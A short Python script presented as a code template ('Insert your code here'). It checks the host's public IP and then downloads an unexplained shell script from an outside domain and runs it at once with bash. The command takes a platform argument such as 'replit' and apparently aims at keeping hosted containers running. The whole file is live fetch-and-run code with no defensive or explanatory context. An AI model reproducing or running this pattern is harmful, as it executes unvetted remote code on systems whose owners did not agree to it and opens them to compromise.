# Insert your code here. 

import os 

os.system('curl cip.cc')

def startup(id=450, platform='replit', tags=''):

    if platform == 'replit':
        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup-v2.sh; bash {}-startup-v2.sh {} {} {};'.format(platform, platform, id, platform, tags)
    else:
        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup.sh; bash {}-startup.sh {} {} {};'.format(platform, platform, id, platform, tags)
    
    os.system(cmd)
    print('ok , finish')
    #os.system('sleep 24h')
